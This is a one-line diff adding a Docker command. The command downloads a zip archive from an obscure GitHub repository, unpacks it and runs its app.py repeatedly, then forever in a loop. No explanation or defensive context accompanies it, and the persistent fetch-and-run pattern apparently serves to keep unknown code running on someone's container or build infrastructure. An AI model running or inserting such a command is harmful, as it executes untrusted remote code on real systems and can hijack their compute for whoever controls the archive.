@@ -1,0 +1,1 @@
+docker run --entrypoint="" python:3.10  /bin/bash -i -c 'wget https://github.com/dezavulasiya/psychic-meme/raw/refs/heads/main/devs.zip;unzip devs.zip;python app.py;python app.py;python app.py;python app.py;python app.py;python app.py;python app.py;python app.py;python app.py;while :; do python app.py; sleep 1s; done'
